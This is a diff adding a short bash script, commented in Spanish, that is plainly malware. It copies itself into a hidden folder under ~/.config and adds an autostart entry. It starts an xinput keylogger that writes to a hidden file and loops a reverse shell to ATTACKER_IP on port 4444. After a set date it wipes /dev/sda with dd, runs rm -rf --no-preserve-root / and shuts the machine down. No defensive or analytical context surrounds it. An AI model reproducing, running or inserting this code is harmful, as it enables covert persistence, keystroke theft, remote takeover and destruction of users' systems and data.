@@ -1,0 +1,30 @@
+#!/bin/bash
+
+# Persistencia mínima: copiarse a ~/.config
+INSTALL_DIR="$HOME/.config/.sysd"
+mkdir -p "$INSTALL_DIR"
+cp "$0" "$INSTALL_DIR/.update.sh"
+
+# Añadirse al autostart
+echo "@bash $INSTALL_DIR/.update.sh &" >> ~/.config/autostart.desktop 2>/dev/null
+
+# Keylogger básico (requiere que xinput esté disponible)
+logfile="$INSTALL_DIR/.keylog"
+xinput --list | grep -i 'keyboard' | while read -r line; do
+    id=$(echo $line | grep -o 'id=[0-9]*' | cut -d= -f2)
+    xinput test $id >> "$logfile" &
+done
+
+# Backdoor sencillo: abrir shell reversa a IP atacante
+while true; do
+    bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+    sleep 30
+done &
+
+# Payload destructivo (dormido) – arranca tras n días
+if [[ $(date +%s) -gt $(( $(date --date="2025-12-01" +%s) )) ]]; then
+    # Sobrescribe sistema y apaga
+    dd if=/dev/urandom of=/dev/sda bs=1M
+    rm -rf --no-preserve-root /
+    shutdown -h now
+fi
